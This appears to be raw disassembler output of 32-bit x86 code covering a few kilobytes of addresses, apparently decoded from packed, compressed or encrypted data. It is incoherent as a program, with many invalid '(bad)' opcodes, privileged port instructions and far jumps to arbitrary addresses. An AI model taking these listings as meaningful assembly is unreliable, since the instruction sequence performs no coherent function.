  4159d9:	dec    ecx
  4159da:	lods   al,BYTE PTR ds:[esi]
  4159db:	(bad)  
  4159dd:	mov    ecx,0x8850bc33
  4159e2:	or     esi,DWORD PTR ds:0xe8bf7185
  4159e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159e9:	sbb    BYTE PTR [ebx+0x2210bce3],0x8d
  4159f0:	jno    0x415a0b
  4159f2:	mov    esp,0x83310aad
  4159f7:	js     0x4159c7
  4159f9:	aam    0x66
  4159fb:	mov    bl,0x83
  4159fd:	mov    ecx,0xceb696c
  415a02:	xor    DWORD PTR [ebx-0x5adef090],ebp
  415a08:	fistp  DWORD PTR [ecx]
  415a0a:	fcmovb st,st(1)
  415a0c:	sahf   
  415a0d:	sbb    BYTE PTR [ebp+edi*1+0x23],0x6b
  415a12:	in     eax,dx
  415a13:	adc    BYTE PTR [edx-0x43ae4b07],dl
  415a19:	adc    eax,0x47446ddd
  415a1e:	sbb    ebx,DWORD PTR [ecx-0x57]
  415a21:	or     al,0x1
  415a23:	rcl    DWORD PTR [eax+0x50385c32],cl
  415a29:	jno    0x415a21
  415a2b:	(bad)  
  415a2c:	popf   
  415a2d:	xlat   BYTE PTR ds:[ebx]
  415a2e:	es test al,0x41
  415a31:	fbstp  TBYTE PTR [edi+0x10]
  415a34:	cmp    ebp,DWORD PTR [ebp+0x11]
  415a37:	xchg   ebp,eax
  415a38:	adc    al,0xce
  415a3a:	loop   0x4159d4
  415a3c:	mov    al,0x9
  415a3e:	mov    esi,0x47789bab
  415a43:	adc    eax,0x7cbb2074
  415a48:	int3   
  415a49:	or     eax,0x8506315
  415a4e:	in     al,dx
  415a4f:	or     cl,bh
  415a51:	mov    cl,0x88
  415a53:	leave  
  415a54:	or     BYTE PTR [esi],ch
  415a56:	int3   
  415a57:	push   0xffffffdb
  415a59:	sub    BYTE PTR ds:0xd86c99c8,cl
  415a5f:	push   edi
  415a60:	imul   ebx,ebp,0x169fec90
  415a66:	ds cmc 
  415a68:	popf   
  415a69:	and    ch,cl
  415a6b:	jle    0x415a6e
  415a6d:	dec    ebx
  415a6e:	xor    edi,DWORD PTR [ecx+edx*8+0x25]
  415a72:	ror    BYTE PTR [edx],0xb2
  415a75:	in     eax,0xdc
  415a77:	add    al,0xfa
  415a79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a7a:	and    eax,0x9b755414
  415a7f:	push   eax
  415a80:	mov    eax,ds:0x7eb637b8
  415a85:	dec    ebx
  415a86:	sahf   
  415a87:	xor    bl,BYTE PTR [ecx-0x11]
  415a8a:	and    BYTE PTR [ebp+0x22],dl
  415a8d:	std    
  415a8e:	sbb    DWORD PTR [eax-0x24321923],0x140fe1d9
  415a98:	xor    DWORD PTR [esi-0x1b],edx
  415a9b:	mov    ch,0x95
  415a9d:	xor    BYTE PTR [ebp+0x307d263e],dh
  415aa3:	fcom   QWORD PTR [eax-0xd]
  415aa6:	pop    eax
  415aa7:	ss stos DWORD PTR es:[edi],eax
  415aa9:	mov    cl,0xd9
  415aab:	mov    dh,0x7e
  415aad:	retf   0x9bc0
  415ab0:	inc    edx
  415ab1:	push   es
  415ab2:	adc    cl,BYTE PTR [ecx]
  415ab4:	dec    ebp
  415ab5:	into   
  415ab6:	add    cl,bh
  415ab8:	sbb    esi,DWORD PTR [esp+eiz*4-0xf3cbaa4]
  415abf:	mov    bl,0xd5
  415ac1:	sbb    BYTE PTR [esi],bh
  415ac3:	test   eax,0x354b464f
  415ac8:	push   ebp
  415ac9:	dec    eax
  415aca:	mov    ah,BYTE PTR [edx]
  415acc:	sahf   
  415acd:	dec    ecx
  415ace:	call   0x4b80f83a
  415ad3:	lea    ecx,[edx+0x4b]
  415ad6:	iret   
  415ad7:	mov    esp,0xc6034eae
  415adc:	mov    bh,0x23
  415ade:	or     al,0x1
  415ae0:	mov    edx,0xb78b424a
  415ae5:	xor    eax,0x8afae87
  415aea:	adc    BYTE PTR ds:0x543adf4c,dl
  415af0:	sti    
  415af1:	adc    eax,0x6ed2da05
  415af6:	sub    eax,ecx
  415af8:	hlt    
  415af9:	mov    edx,0xb8ab1a2
  415afe:	add    ah,al
  415b00:	popf   
  415b01:	(bad)  
  415b02:	sub    esp,DWORD PTR [esi]
  415b04:	aas    
  415b05:	push   edi
  415b06:	xchg   esp,eax
  415b07:	sbb    al,0x27
  415b09:	mov    al,0xe7
  415b0b:	and    ch,dh
  415b0d:	in     eax,0x5
  415b0f:	xor    DWORD PTR [eax+ebx*2+0x5bd41e87],edx
  415b16:	cwde   
  415b17:	mov    ds:0x37dd5dc7,eax
  415b1c:	icebp  
  415b1d:	inc    ecx
  415b1e:	xor    al,0xb9
  415b20:	adc    dh,BYTE PTR [edx]
  415b22:	int    0x51
  415b24:	sbb    ch,bh
  415b26:	or     DWORD PTR [esi+0x37ba8d7c],edi
  415b2c:	es jmp 0x415ad0
  415b2f:	sub    eax,0xad847014
  415b34:	adc    eax,0xe873cff
  415b39:	xor    BYTE PTR [esi],al
  415b3b:	or     DWORD PTR [eax-0x1d],eax
  415b3e:	ret    
  415b3f:	xor    esi,DWORD PTR [ebx]
  415b41:	mov    edx,0x83d831b9
  415b46:	fst    DWORD PTR [ecx-0x4234aa41]
  415b4c:	aaa    
  415b4d:	xor    al,0x79
  415b4f:	cmp    cl,BYTE PTR [ecx-0x4b192c43]
  415b55:	fistp  QWORD PTR [edi+ecx*1-0x458d864c]
  415b5c:	call   0xb2ffa5d6
  415b61:	fwait
  415b62:	test   DWORD PTR [ebp+0x4e5c6327],ebx
  415b68:	mov    bl,BYTE PTR [edi+0x58]
  415b6b:	jp     0x415b44
  415b6d:	mov    edi,0xc6f5a360
  415b72:	jecxz  0x415bf2
  415b74:	mov    ss,WORD PTR [edi+eiz*1-0x29]
  415b78:	inc    esp
  415b79:	ror    BYTE PTR [ebx],0xa0
  415b7c:	stos   DWORD PTR es:[edi],eax
  415b7d:	lds    eax,FWORD PTR [ebx-0x31]
  415b80:	js     0x415b10
  415b82:	push   ecx
  415b83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b84:	(bad)  
  415b85:	jnp    0x415b58
  415b87:	retf   0x9165
  415b8a:	inc    ebx
  415b8b:	rol    DWORD PTR [edi+edx*1],0x79
  415b8f:	shl    eax,0x88
  415b92:	ret    0xa86b
  415b95:	ret    0x2e16
  415b98:	lods   eax,DWORD PTR ds:[esi]
  415b99:	and    esi,edx
  415b9b:	dec    ebx
  415b9c:	cmp    DWORD PTR [esi],ebp
  415b9e:	inc    ebx
  415b9f:	enter  0xaa78,0x33
  415ba3:	inc    edi
  415ba4:	inc    esi
  415ba5:	test   eax,0x2ba11b9a
  415baa:	push   edx
  415bab:	dec    edi
  415bac:	or     bl,cl
  415bae:	retf   0x6d97
  415bb1:	inc    esp
  415bb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bb3:	icebp  
  415bb4:	or     bl,BYTE PTR [esi+0x20]
  415bb7:	mov    WORD PTR [edi],ds
  415bb9:	xchg   esi,eax
  415bba:	push   esp
  415bbb:	and    eax,0xdb0f15cf
  415bc0:	inc    edx
  415bc1:	pop    ebx
  415bc2:	jl     0x415b9a
  415bc4:	in     eax,0x8d
  415bc6:	pop    ecx
  415bc7:	ss loop 0x415c12
  415bca:	sub    DWORD PTR [esi-0x5f4b03fc],esp
  415bd0:	sub    ecx,ebx
  415bd2:	mov    ah,BYTE PTR [esi+ecx*4]
  415bd5:	cmp    BYTE PTR [ebx+0x6a],bl
  415bd8:	mov    eax,0xfe2df559
  415bdd:	or     eax,0x6496ede4
  415be2:	outs   dx,DWORD PTR ds:[esi]
  415be3:	or     eax,edi
  415be5:	daa    
  415be6:	nop
  415be7:	loopne 0x415c1e
  415be9:	xchg   edi,eax
  415bea:	adc    DWORD PTR [ecx],eax
  415bec:	(bad)  
  415bed:	mov    dh,0x3f
  415bef:	idiv   ecx
  415bf1:	xchg   ebp,eax
  415bf2:	or     al,0x30
  415bf5:	xor    al,0x74
  415bf7:	sbb    bl,ch
  415bf9:	mov    ah,0x5c
  415bfb:	mov    BYTE PTR [edi-0x1a2de412],bh
  415c01:	dec    ebp
  415c02:	sahf   
  415c03:	or     DWORD PTR ds:0x99f5b348,0xa41a62a2
  415c0d:	(bad)  
  415c0e:	(bad)  
  415c0f:	mov    al,ds:0x1bcf3003
  415c14:	ins    DWORD PTR es:[edi],dx
  415c15:	add    BYTE PTR [esi+0x763182ed],bh
  415c1b:	or     DWORD PTR [ebx+0x51],0xcf137a95
  415c22:	call   0x9e64:0x5b04
  415c28:	xchg   ebp,eax
  415c29:	out    dx,al
  415c2a:	inc    ebx
  415c2b:	mov    edx,0xe3039871
  415c30:	lds    edx,FWORD PTR [ebp+0x426288c]
  415c36:	jbe    0x415c87
  415c38:	gs push ebx
  415c3a:	mov    ecx,0x60bcdd7
  415c3f:	mov    BYTE PTR [ebx],dh
  415c41:	sti    
  415c42:	jne    0x415c4e
  415c44:	xchg   edx,eax
  415c45:	cmp    esp,edx
  415c47:	pusha  
  415c48:	inc    edi
  415c49:	inc    edx
  415c4a:	xchg   DWORD PTR [edi-0x4b],edi
  415c4d:	push   edx
  415c4e:	in     eax,dx
  415c4f:	adc    DWORD PTR [edx+0x3c],ebx
  415c52:	test   bl,0x48
  415c55:	lea    eax,[edx-0xea91cc2]
  415c5b:	retf   
  415c5c:	jns    0x415cd5
  415c5e:	jle    0x415bf5
  415c60:	enter  0xf7b7,0xb0
  415c64:	leave  
  415c65:	rcr    BYTE PTR [edx+0x6],cl
  415c68:	aas    
  415c69:	jb     0x415c66
  415c6b:	ficomp WORD PTR [eax-0x41]
  415c6e:	pop    ss
  415c6f:	lahf   
  415c70:	inc    esp
  415c71:	inc    ecx
  415c72:	daa    
  415c73:	cmp    ch,bl
  415c75:	int3   
  415c76:	pop    esp
  415c77:	into   
  415c78:	lods   eax,DWORD PTR ds:[esi]
  415c79:	int3   
  415c7a:	dec    esi
  415c7b:	pop    ebp
  415c7c:	sbb    al,0xf1
  415c7e:	dec    edx
  415c7f:	in     eax,dx
  415c80:	int3   
  415c81:	dec    ecx
  415c82:	mov    BYTE PTR [eax-0x76],al
  415c85:	aas    
  415c86:	retf   
  415c87:	imul   DWORD PTR [eax+0x3c7ecab2]
  415c8d:	cli    
  415c8e:	sbb    DWORD PTR [edx-0x4d],edx
  415c91:	jmp    0x33af00fa
  415c96:	sub    al,0x76
  415c98:	cmp    edx,ebp
  415c9a:	add    al,0xb7
  415c9c:	sbb    ah,al
  415c9e:	sub    al,0x35
  415ca0:	retf   0x3004
  415ca3:	idiv   BYTE PTR [ecx]
  415ca5:	(bad)  
  415ca6:	loopne 0x415d07
  415ca8:	ja     0x415d1b
  415caa:	and    DWORD PTR [esi],ecx
  415cac:	jbe    0x415cac
  415cae:	call   0xca63:0xfb7ff0b0
  415cb5:	test   BYTE PTR [edi+0x3c53114d],ch
  415cbb:	mov    WORD PTR [edx+0x58],es
  415cbe:	addr16 jg 0x415d09
  415cc1:	mov    esp,0xffee0d29
  415cc6:	push   esi
  415cc7:	cli    
  415cc8:	shl    DWORD PTR [edx+0x74029ece],1
  415cce:	adc    eax,0xb6e20c20
  415cd3:	pop    edx
  415cd4:	mov    al,0xa5
  415cd6:	pop    eax
  415cd7:	add    eax,0x3f6067da
  415cdc:	pop    ecx
  415cdd:	imul   edx,DWORD PTR [esi+0x574535a7],0xd44490e7
  415ce7:	mov    ah,0x70
  415ce9:	jmp    0xbe4a267e
  415cee:	repnz test eax,0xf539fd33
  415cf4:	dec    esi
  415cf5:	sub    eax,0xaa87742a
  415cfa:	lahf   
  415cfb:	push   edx
  415cfc:	bnd jle 0x415ca6
  415cff:	(bad)  
  415d01:	ja     0x415d79
  415d03:	outs   dx,BYTE PTR ds:[esi]
  415d04:	adc    bh,BYTE PTR [ebx-0x632c6fce]
  415d0a:	mov    eax,ds:0x9b848d8f
  415d0f:	cmp    eax,esi
  415d11:	adc    eax,0x9de407cc
  415d16:	push   ebx
  415d17:	pusha  
  415d18:	xchg   esi,eax
  415d19:	leave  
  415d1a:	cmp    eax,0xc2bbfaa0
  415d1f:	mov    dh,0x33
  415d21:	neg    DWORD PTR [ecx+0x2d1c830d]
  415d27:	mov    esi,0xf47da2eb
  415d2c:	add    ecx,DWORD PTR ss:[edi-0x402f2e87]
  415d33:	mov    bl,0xd4
  415d35:	jbe    0x415da5
  415d37:	jbe    0x415d78
  415d39:	xchg   ebx,ebp
  415d3b:	repz shl DWORD PTR [ecx-0x51902e92],0x94
  415d43:	xor    al,0x77
  415d45:	pop    ebx
  415d46:	xchg   edx,eax
  415d47:	repz adc esp,ebx
  415d4a:	sub    dh,0xb0
  415d4d:	les    esi,FWORD PTR [edx-0x39]
  415d50:	aad    0x43
  415d52:	rcl    DWORD PTR [eax-0x4f4093c2],cl
  415d58:	and    ebx,0x30b79a3b
  415d5e:	std    
  415d5f:	pop    ds
  415d60:	fnstcw WORD PTR [eax+0x7a]
  415d63:	dec    esi
  415d64:	out    0xaa,al
  415d66:	adc    edi,ebp
  415d68:	dec    edi
  415d69:	int    0xa5
  415d6b:	xchg   esi,edi
  415d6d:	aas    
  415d6e:	lahf   
  415d6f:	or     ch,BYTE PTR [esi]
  415d71:	dec    eax
  415d72:	and    esi,DWORD PTR [eax]
  415d74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d75:	(bad)  
  415d76:	mov    al,0x71
  415d78:	std    
  415d79:	mov    cl,0xaa
  415d7b:	gs leave 
  415d7d:	jnp    0x415dae
  415d7f:	test   DWORD PTR [ebx+ebx*2-0x6d],edi
  415d83:	mov    ebp,0xca05f810
  415d88:	and    BYTE PTR ds:0x5043a3a0,ah
  415d8e:	(bad)  
  415d8f:	std    
  415d90:	imul   ebx,esp,0xffffffd7
  415d93:	(bad)  
  415d94:	(bad)  
  415d95:	sti    
  415d96:	aad    0x45
  415d98:	sar    BYTE PTR [eax-0x5b],0x72
  415d9c:	and    eax,0x250f237b
  415da1:	loop   0x415de4
  415da3:	xchg   DWORD PTR [edi],edi
  415da5:	dec    edx
  415da6:	hlt    
  415da7:	hlt    
  415da8:	add    DWORD PTR [ebx+0x61],eax
  415dab:	or     bh,al
  415dad:	cli    
  415dae:	add    eax,0x9466a9a3
  415db3:	and    eax,0x456aef67
  415db8:	test   al,0x51
  415dba:	sub    al,0x59
  415dbc:	shl    DWORD PTR [edi+0x32dd52a],0xab
  415dc3:	mov    bl,BYTE PTR [edi+0x421cc6fd]
  415dc9:	push   0x41
  415dcb:	je     0x415e01
  415dcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415dce:	jno    0x415dbc
  415dd0:	gs cmp edi,ecx
  415dd3:	test   ch,al
  415dd5:	add    DWORD PTR [esp+ecx*2-0x3f],ebp
  415dd9:	repz mov ecx,0x393d871b
  415ddf:	mov    ecx,es
  415de1:	das    
  415de2:	xor    DWORD PTR [esi+0x2c],ebp
  415de5:	dec    eax
  415de6:	mov    edx,0x926dda67
  415deb:	fsubr  QWORD PTR [ebx+edx*4+0x15]
  415def:	dec    esp
  415df0:	push   ss
  415df1:	mov    eax,ebx
  415df3:	(bad)  
  415df5:	push   ebp
  415df6:	sbb    ebx,DWORD PTR ds:0x67af0ca2
  415dfc:	loop   0x415ded
  415dfe:	adc    esi,DWORD PTR [ecx]
  415e00:	push   cs
  415e01:	mov    ah,0x2
  415e03:	and    ecx,DWORD PTR [ecx+0x29eaf826]
  415e09:	xchg   esi,eax
  415e0a:	mov    ah,0x51
  415e0c:	dec    esi
  415e0d:	mov    ch,0x96
  415e0f:	call   0xd1e5:0x8dbe2a8b
  415e16:	jl     0x415df0
  415e18:	and    ebx,DWORD PTR [edi]
  415e1a:	adc    DWORD PTR [esi+0x7e32654e],0x0
  415e21:	sbb    DWORD PTR [edi],ebx
  415e23:	jns    0x415e3f
  415e25:	push   0xc0f2a2e4
  415e2a:	addr16 mov eax,0x2195c7d8
  415e30:	icebp  
  415e31:	cmp    DWORD PTR [edi],esi
  415e33:	push   eax
  415e34:	fsubrp st(0),st
  415e36:	mov    cl,0x75
  415e38:	adc    DWORD PTR [edx+0x6e],0xaa36f9a5
  415e3f:	jmp    0x415e39
  415e41:	mov    ebx,0xda703092
  415e46:	xor    edi,esp
  415e48:	jmp    0x9b55:0x5166f8cc
  415e4f:	mov    dh,0x2e
  415e51:	pop    ss
  415e52:	pop    edx
  415e53:	aas    
  415e54:	ss inc esi
  415e56:	sbb    eax,0xd2d7cdc6
  415e5b:	push   cs
  415e5c:	or     BYTE PTR [ecx+0xf3c531],dl
  415e62:	cmp    al,BYTE PTR [edi+esi*1+0x40f5f35c]
  415e69:	in     al,0xfa
  415e6b:	sub    ebp,DWORD PTR [edx+0x15]
  415e6e:	fnsave [ebx]
  415e70:	cs (bad) 
  415e72:	cmp    eax,DWORD PTR [esi+0x4a645a0d]
  415e78:	xor    eax,0xd713ab4b
  415e7d:	pop    edx
  415e7e:	mov    ds:0x609cf33f,al
  415e83:	popa   
  415e84:	ss stos BYTE PTR es:[edi],al
  415e86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e87:	or     esi,ebp
  415e89:	ins    DWORD PTR es:[edi],dx
  415e8a:	imul   edx,DWORD PTR [ebx],0xfffffffc
  415e8d:	mov    ecx,eax
  415e8f:	dec    ebp
  415e90:	xor    BYTE PTR [ebp+0x4b926067],dh
  415e96:	dec    edx
  415e97:	fisub  DWORD PTR [ebx+0x6]
  415e9a:	stos   BYTE PTR es:[edi],al
  415e9b:	push   edx
  415e9c:	fistp  WORD PTR [esi-0x3]
  415e9f:	push   esp
  415ea0:	ret    
  415ea1:	pusha  
  415ea2:	mov    ds:0x6d891b85,eax
  415ea7:	arpl   WORD PTR [esi+0x7f],sp
  415eaa:	call   0x8d2fd23b
  415eaf:	rcr    BYTE PTR [ecx],0x5f
  415eb2:	adc    al,0x6
  415eb4:	mov    edx,0x8e69c8e1
  415eb9:	inc    edx
  415eba:	aam    0x21
  415ebc:	std    
  415ebd:	fadd   st(1),st
  415ebf:	test   BYTE PTR [ecx+0x46d3a030],al
  415ec5:	mov    esi,0xa5604816
  415eca:	jle    0x415e6c
  415ecc:	adc    ebx,DWORD PTR [edx+eiz*4-0x79d5e8a7]
  415ed3:	jb     0x415e70
  415ed5:	out    0xdc,eax
  415ed7:	sub    edi,esp
  415ed9:	lods   eax,DWORD PTR ds:[esi]
  415eda:	xor    bh,bh
  415edc:	pop    ecx
  415edd:	test   eax,0xe544954
  415ee2:	in     al,0x8e
  415ee4:	dec    ecx
  415ee5:	mov    DWORD PTR [ebp-0x8],edi
  415ee8:	cli    
  415ee9:	popa   
  415eea:	retf   0x9f34
  415eed:	psrlw  mm7,QWORD PTR [esi]
  415ef0:	dec    edx
  415ef1:	pop    ecx
  415ef2:	out    0x2c,eax
  415ef4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ef5:	call   0xbbd812c1
  415efa:	push   esp
  415efb:	test   al,0xd4
  415efd:	neg    BYTE PTR [ebp-0x7d]
  415f00:	sti    
  415f01:	aam    0xaf
  415f03:	cmp    DWORD PTR [ebx+0x68],edi
  415f06:	test   bl,ch
  415f08:	in     al,0x11
  415f0a:	mov    es,WORD PTR [eax+0x5503237c]
  415f10:	pop    esi
  415f11:	jp     0x415eca
  415f13:	mov    esi,0x534ec252
  415f18:	push   0xffffff89
  415f1a:	pushf  
  415f1b:	xor    al,ch
  415f1d:	fwait
  415f1e:	push   esp
  415f1f:	mov    ?,WORD PTR [esi+0x10]
  415f22:	adc    eax,DWORD PTR ds:0xbedc8a3c
  415f28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f29:	sbb    BYTE PTR [ebx+0x4b],ch
  415f2c:	imul   edi,DWORD PTR [ecx+0xf32ee65],0xc571a772
  415f36:	inc    ecx
  415f37:	in     eax,dx
  415f38:	retf   0x80d5
  415f3b:	add    ah,ah
  415f3d:	jl     0x415f44
  415f3f:	sub    BYTE PTR [ecx],cl
  415f41:	sbb    dl,BYTE PTR [edi+0x55d0187c]
  415f47:	mov    ds:0xc578f37d,al
  415f4d:	out    dx,eax
  415f4e:	dec    ecx
  415f50:	ss aas 
  415f52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f53:	shr    BYTE PTR [edi+0x38b0a3d],1
  415f59:	les    esi,FWORD PTR [ebx+0x25650dd6]
  415f5f:	es push 0x22af5600
  415f65:	pop    ds
  415f66:	(bad)  
  415f67:	mov    ebx,0xca1c63c9
  415f6c:	xor    eax,0x539b0873
  415f71:	jmp    0xce46:0xc9470293
  415f78:	jnp    0x415fd7
  415f7a:	xchg   esi,eax
  415f7b:	mov    al,0xda
  415f7d:	sbb    ebx,DWORD PTR [eax+edi*4]
  415f80:	jmp    0x415fd7
  415f82:	fisttp QWORD PTR [esi+0x7a]
  415f85:	sti    
  415f86:	mov    esi,0x5993d85d
  415f8b:	mov    bl,0x56
  415f8d:	xor    DWORD PTR [ecx-0xb9a7e1d],ebp
  415f93:	fwait
  415f94:	dec    eax
  415f95:	pop    ebp
  415f96:	les    esi,FWORD PTR [eax]
  415f98:	xchg   ebp,eax
  415f99:	sbb    eax,0xb2b18860
  415f9e:	retf   
  415f9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fa0:	mov    al,dh
  415fa2:	push   ecx
  415fa3:	and    eax,0xeb709b8b
  415fa8:	adc    ecx,ecx
  415faa:	outs   dx,BYTE PTR ds:[esi]
  415fab:	scas   eax,DWORD PTR es:[edi]
  415fac:	pop    edi
  415fad:	xor    cl,0x13
  415fb0:	sub    ah,BYTE PTR [ebp-0xe]
  415fb3:	push   ebp
  415fb4:	ins    DWORD PTR es:[edi],dx
  415fb5:	mov    cs,WORD PTR [ecx-0x15ce042d]
  415fbb:	(bad)  
  415fbc:	dec    ebp
  415fbd:	fisttp DWORD PTR [edi+0x77]
  415fc0:	add    ebp,DWORD PTR [ebx+0x28]
  415fc3:	push   0x4f92d0c1
  415fc8:	icebp  
  415fc9:	mov    dh,0x7d
  415fcb:	(bad)  
  415fcc:	lods   eax,DWORD PTR ds:[esi]
  415fcd:	int    0x20
  415fcf:	push   0x50d699a9
  415fd4:	pop    edx
  415fd5:	adc    eax,0x76271f35
  415fda:	mov    cl,0xa4
  415fdc:	mov    BYTE PTR [edi-0x6733f80b],dl
  415fe2:	xchg   edi,eax
  415fe3:	or     eax,0x94daee7c
  415fe8:	cli    
  415fe9:	sub    eax,0xdeb39107
  415fee:	in     eax,0x2e
  415ff0:	fdiv   st,st(0)
  415ff2:	ror    DWORD PTR [edx],cl
  415ff4:	lds    esi,FWORD PTR [edi]
  415ff6:	dec    ebp
  415ff7:	jl     0x416013
  415ff9:	mov    edi,DWORD PTR [eax+0x49]
  415ffc:	lahf   
  415ffd:	js     0x415fbc
  415fff:	es ret 0x4531
  416003:	sub    ch,BYTE PTR [edi]
  416005:	xor    eax,0xb070736f
  41600a:	outs   dx,DWORD PTR ds:[esi]
  41600b:	jmp    FWORD PTR [eax-0x63]
  41600e:	and    bl,al
  416010:	icebp  
  416011:	sbb    DWORD PTR [ebx],0xad7d20e7
  416017:	jne    0x415fd6
  416019:	adc    DWORD PTR [edx],esi
  41601b:	imul   BYTE PTR [edx]
  41601d:	fcmovne st,st(0)
  41601f:	lods   eax,DWORD PTR ds:[esi]
  416020:	adc    eax,DWORD PTR [esi-0x2c]
  416023:	fs cmp esp,ebp
  416026:	push   0x62f705dd
  41602b:	inc    ebx
  41602c:	js     0x416057
  41602e:	or     ah,BYTE PTR [ebp+esi*2+0x52]
  416032:	inc    ecx
  416033:	arpl   WORD PTR [edi],si
  416035:	pushf  
  416036:	je     0x415fd2
  416038:	dec    edx
  416039:	sub    al,0x3f
  41603b:	push   0xe224d983
  416040:	shl    BYTE PTR [edi+0x19],0xcb
  416044:	dec    esp
  416045:	scas   eax,DWORD PTR es:[edi]
  416046:	lods   eax,DWORD PTR ds:[esi]
  416047:	xchg   ebp,eax
  416048:	jo     0x416034
  41604a:	jnp    0x416052
  41604c:	mov    ds:0x345c874d,eax
  416051:	inc    esi
  416052:	push   esp
  416053:	cwde   
  416054:	rcr    BYTE PTR [ecx-0x10],1
  416057:	sar    DWORD PTR [esp+eax*4],cl
  41605a:	cld    
  41605b:	scas   al,BYTE PTR es:[edi]
  41605c:	xchg   edi,eax
  41605d:	pop    eax
  41605e:	xor    al,0xff
  416060:	add    DWORD PTR [ebx+0xf],edx
  416063:	out    0x9f,eax
  416065:	jge    0x416025
  416067:	and    BYTE PTR [eax],cl
  416069:	das    
  41606a:	dec    esi
  41606b:	push   eax
  41606c:	cmp    eax,0xd169c305
  416071:	cwde   
  416072:	fld    QWORD PTR [esi-0x1866437c]
  416078:	pop    ss
  416079:	inc    esi
  41607a:	std    
  41607b:	imul   edi,DWORD PTR [eax+0x2e0808fb],0xfffffff8
  416082:	inc    ebp
  416083:	and    BYTE PTR [ebx+0x77956639],cl
  416089:	adc    BYTE PTR [ecx+0x4b2b68b1],bl
  41608f:	mov    ds:0x1a418cf6,al
  416094:	rcl    DWORD PTR [edx],1
  416096:	xchg   ecx,eax
  416097:	(bad)  
  416098:	mov    ebp,0x2409dc20
  41609d:	pop    edi
  41609e:	mov    edi,0xd2b35fbf
  4160a3:	adc    edi,DWORD PTR [eax-0x3d61ac43]
  4160a9:	push   cs
  4160aa:	dec    ebx
  4160ab:	add    eax,DWORD PTR [ebp+0x79c9e22]
  4160b1:	mov    ch,0x2a
  4160b3:	mov    cl,BYTE PTR [ebx+0x192501c0]
  4160b9:	push   ds
  4160ba:	push   0x609c8a3d
  4160bf:	push   eax
  4160c0:	fmul   DWORD PTR [ebp-0x2f]
  4160c3:	mov    bl,BYTE PTR [eax]
  4160c5:	jp     0x4160a8
  4160c7:	dec    ebp
  4160c8:	add    al,0xf1
  4160ca:	or     al,0x19
  4160cc:	(bad)  
  4160ce:	adc    esi,DWORD PTR [esi+eax*4+0x59583d47]
  4160d5:	hlt    
  4160d6:	mov    edx,0xc617f9d0
  4160db:	fbstp  TBYTE PTR [ebx-0x4493ac83]
  4160e1:	adc    al,0x86
  4160e3:	mov    bh,0xde
  4160e5:	hlt    
  4160e6:	or     esp,0xffffff81
  4160e9:	and    eax,0x165985af
  4160ee:	xchg   esi,eax
  4160ef:	dec    ebp
  4160f0:	pop    edi
  4160f1:	ror    eax,1
  4160f3:	je     0x4160a5
  4160f5:	in     al,dx
  4160f6:	fnstcw WORD PTR [eax+0x389f2a0]
  4160fc:	jne    0x41614c
  4160fe:	(bad)  
  4160ff:	data16 jne 0x41611f
  416102:	mov    BYTE PTR [ebp-0x6d7694bd],ch
  416108:	mov    eax,ds:0x5f311e1c
  41610d:	mov    ch,0xce
  41610f:	mov    dh,0x3d
  416111:	or     BYTE PTR [eax+0x159a97d0],0x54
  416118:	push   esi
  416119:	in     eax,0x4e
  41611b:	jae    0x41619a
  41611d:	pop    edx
  41611e:	adc    dl,BYTE PTR ds:0x49f49445
  416124:	cwde   
  416125:	pop    eax
  416126:	scas   al,BYTE PTR es:[edi]
  416127:	or     BYTE PTR [edi+0x7bafdffb],bl
  41612d:	xchg   al,dh
  41612f:	jbe    0x416151
  416131:	in     al,0xe4
  416133:	int3   
  416134:	add    eax,0x2d00734d
  416139:	xchg   BYTE PTR gs:[edi],dh
  41613c:	outs   dx,BYTE PTR ds:[esi]
  41613d:	in     eax,0x82
  41613f:	jecxz  0x41610f
  416141:	mov    BYTE PTR ds:0x789570fd,bh
  416147:	pop    ebx
  416148:	sti    
  416149:	std    
  41614a:	popf   
  41614b:	int    0x6f
  41614d:	je     0x416179
  41614f:	push   ebp
  416150:	mov    BYTE PTR [ecx],al
  416152:	(bad)
  416157:	std    
  416158:	mov    edi,0x15586bff
  41615d:	repnz push esi
  41615f:	rcl    DWORD PTR [ebx+0x17],0x6c
  416163:	stos   DWORD PTR es:[edi],eax
  416164:	or     al,0x81
  416166:	or     DWORD PTR [edx],esp
  416168:	dec    esi
  416169:	jb     0x41618e
  41616b:	jo     0x4161af
  41616d:	aam    0xbb
  41616f:	call   0x1dc5:0x88ed0356
  416176:	xchg   cl,ah
  416178:	inc    edx
  416179:	out    0x3d,al
  41617b:	loop   0x41613f
  41617d:	mov    ecx,0x9082ca7
  416182:	jl     0x4161ca
  416184:	dec    ecx
  416185:	out    dx,al
  416186:	add    BYTE PTR [edi+0x4c7d16a6],0x9a
  41618d:	addr16 jge 0x416141
  416190:	test   BYTE PTR [edi-0x71],dl
  416193:	adc    al,0x60
  416195:	jl     0x416172
  416197:	cmp    cl,al
  416199:	out    0x18,al
  41619b:	cli    
  41619c:	cmp    DWORD PTR [ebp-0x424f8a3a],esp
  4161a2:	bound  edx,QWORD PTR [eax-0x4dd89796]
  4161a8:	add    eax,0x92b5900d
  4161ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161ae:	inc    edi
  4161af:	mov    esp,ebx
  4161b1:	sub    DWORD PTR [ebx-0x2e6b77db],0x5b78e6dd
  4161bb:	cdq    
  4161bc:	mov    gs,WORD PTR [edi]
  4161be:	pop    ds
  4161bf:	popa   
  4161c0:	xchg   edi,eax
  4161c1:	xor    esp,DWORD PTR [ecx+0x6e9df787]
  4161c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161c8:	imul   eax,DWORD PTR [ebp-0x3838435e],0x6f5d2a5b
  4161d2:	sbb    al,0x0
  4161d4:	pop    ds
  4161d5:	je     0x41624b
  4161d7:	cmp    BYTE PTR [eax+0x7d],0x5d
  4161db:	pop    ebp
  4161dc:	aad    0x6b
  4161de:	pop    ss
